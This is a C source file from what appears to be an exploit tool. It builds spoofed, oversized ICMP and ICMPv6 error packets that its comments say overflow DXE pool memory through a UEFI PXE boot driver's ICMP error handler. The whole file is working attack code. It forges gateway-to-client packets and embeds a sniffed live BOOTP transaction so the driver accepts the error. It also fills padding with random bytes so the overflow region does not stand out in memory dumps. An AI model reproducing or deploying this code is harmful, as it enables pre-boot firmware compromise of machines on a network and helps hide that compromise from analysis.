/* craft.c - build the oversized ICMP error message.
 *
 * Datagram layout:
 *
 *   [ outer IPv4/IPv6 header ]                  spoofed gateway -> client
 *   [ ICMP error header        8 bytes ]
 *   [ embedded original IP hdr 20 bytes ]  <-- required so the IP layer
 *   [ embedded original UDP hdr 8 bytes ]       matches the error to the
 *   [ embedded original data    8 bytes ]       driver's in-flight token
 *   [ filler                ...        ]   <-- lands in Mode->IcmpError,
 *                                              harmless
 *   [ overflow payload  off .. off+n   ]   <-- lands on the DXE pool objects
 *                                              at pool_base + off
 *
 * The embedded original datagram must be a *live* request on the driver's UDP
 * instance or the error is discarded before PxeBcIcmpErrorDpcHandle() runs.
 * sniffer in uart.c pulls the real BOOTP xid off the wire.
 */

#include <string.h>
#include "pxe_layout.h"
#include "craft.h"

static uint32_t rng_state = 0x9e3779b9u;
static uint32_t xrand(void)
{
  rng_state ^= rng_state << 13;
  rng_state ^= rng_state >> 17;
  rng_state ^= rng_state << 5;
  return rng_state;
}

void craft_seed(uint32_t s) { rng_state = s ? s : 1; }

size_t craft_icmp4(uint8_t *out, size_t cap, const craft_req_t *rq)
{
  size_t   icmp_len = rq->off + rq->overflow_len;
  size_t   total    = sizeof(ip4_hdr_t) + icmp_len;
  size_t   i;
  uint8_t *msg;
  icmp_err_hdr_t *ih;
  ip4_hdr_t *eip, *oip;
  udp_hdr_t *eudp;

  if (total > cap || total > 0xffff)
    return 0;

  memset(out, 0, total);
  msg = out + sizeof(ip4_hdr_t);
  ih  = (icmp_err_hdr_t *)msg;
  ih->type = rq->icmp_type;      /* 3 dest-unreach / 11 time-exceeded */
  ih->code = rq->icmp_code;

  /* Embedded original datagram: this is what the receive path validates. */
  eip = (ip4_hdr_t *)(msg + PXE_ICMP_HDR_SIZE);
  eip->ver_ihl  = 0x45;
  eip->tot_len  = pxe_htons((uint16_t)(PXE_EMBED_IP_HDR + PXE_EMBED_UDP_HDR + 8));
  eip->id       = pxe_htons((uint16_t)xrand());
  eip->ttl      = 64;
  eip->proto    = 17;            /* UDP */
  eip->saddr    = rq->embed_src;
  eip->daddr    = rq->embed_dst;
  eip->checksum = csum_be(eip, sizeof(*eip), 0);

  eudp = (udp_hdr_t *)(msg + PXE_ICMP_HDR_SIZE + PXE_EMBED_IP_HDR);
  eudp->sport = pxe_htons(rq->embed_sport);
  eudp->dport = pxe_htons(rq->embed_dport);
  eudp->len   = pxe_htons((uint16_t)(PXE_EMBED_UDP_HDR + 8));

  memcpy(msg + PXE_GRAFT_START, rq->embed_data, 8);

  /* Filler up to the first byte that matters.  Randomised so the region does
   * not show up as an obvious repeated pattern in a memory dump. */
  for (i = PXE_GRAFT_START + 8; i < rq->off; i++)
    msg[i] = (uint8_t)(xrand() & 0xff);

  memcpy(msg + rq->off, rq->overflow, rq->overflow_len);

  ih->checksum = 0;
  ih->checksum = csum_be(msg, icmp_len, 0);

  oip = (ip4_hdr_t *)out;
  oip->ver_ihl  = 0x45;
  oip->tot_len  = pxe_htons((uint16_t)total);
  oip->id       = pxe_htons((uint16_t)xrand());
  oip->ttl      = 64;
  oip->proto    = 1;             /* ICMP */
  oip->saddr    = rq->src;
  oip->daddr    = rq->dst;
  oip->checksum = csum_be(oip, sizeof(*oip), 0);

  return total;
}

size_t craft_icmp6(uint8_t *out, size_t cap, const craft_req_t *rq)
{
  size_t   icmp_len = rq->off + rq->overflow_len;
  size_t   i;
  icmp6_err_hdr_t *ih;
  ip4_hdr_t *eip;
  udp_hdr_t *eudp;

  if (icmp_len > cap || icmp_len > 0xffff)
    return 0;
  memset(out, 0, icmp_len);

  ih = (icmp6_err_hdr_t *)out;
  ih->type = rq->icmp_type;   /* 1 dst-unreach, 2 pkt-too-big, 3 ttl, 4 param */
  ih->code = rq->icmp_code;

  if (rq->embed_v6_hdr) {
    memcpy(out + PXE_ICMP_HDR_SIZE, rq->embed_v6_hdr, rq->embed_v6_hdr_len);
  } else {
    /* v6 client, v4 PXE server: the embedded datagram keeps its v4 header. */
    eip = (ip4_hdr_t *)(out + PXE_ICMP_HDR_SIZE);
    eip->ver_ihl = 0x45;
    eip->tot_len = pxe_htons((uint16_t)(PXE_EMBED_IP_HDR + PXE_EMBED_UDP_HDR + 8));
    eip->ttl = 64; eip->proto = 17;
    eip->saddr = rq->embed_src; eip->daddr = rq->embed_dst;
    eip->checksum = csum_be(eip, sizeof(*eip), 0);
    eudp = (udp_hdr_t *)(out + PXE_ICMP_HDR_SIZE + PXE_EMBED_IP_HDR);
    eudp->sport = pxe_htons(rq->embed_sport);
    eudp->dport = pxe_htons(rq->embed_dport);
    eudp->len   = pxe_htons((uint16_t)(PXE_EMBED_UDP_HDR + 8));
    memcpy(out + PXE_GRAFT_START, rq->embed_data, 8);
  }

  for (i = PXE_GRAFT_START + 8; i < rq->off; i++)
    out[i] = (uint8_t)(xrand() & 0xff);
  memcpy(out + rq->off, rq->overflow, rq->overflow_len);

  ih->checksum = 0;
  ih->checksum = icmp6_csum(out, icmp_len, rq->src6, rq->dst6);
  return icmp_len;
}

/* ------------------------------------------------------------------------ *
 * IPv6 datagram: the header has to be present because the sender uses
 * IPV6_HDRINCL, and the ICMPv6 checksum covers a pseudo-header built from the
 * addresses we are spoofing.
 * ------------------------------------------------------------------------ */
size_t craft_ipv6_packet(uint8_t *out, size_t cap, const craft_req_t *rq)
{
  size_t icmp_len;
  ip6_hdr_t *ip6;

  if (cap <= IP6_HDR_LEN)
    return 0;

  icmp_len = craft_icmp6(out + IP6_HDR_LEN, cap - IP6_HDR_LEN, rq);
  if (!icmp_len)
    return 0;

  ip6 = (ip6_hdr_t *)out;
  memset(ip6, 0, IP6_HDR_LEN);
  ip6->ver_tc_flow = pxe_htonl(0x60000000u);        /* version 6 */
  ip6->payload_len = pxe_htons((uint16_t)icmp_len);
  ip6->next_hdr    = IPPROTO_ICMPV6_N;
  ip6->hop_limit   = 64;
  memcpy(ip6->src, rq->src6, 16);
  memcpy(ip6->dst, rq->dst6, 16);

  return IP6_HDR_LEN + icmp_len;
}
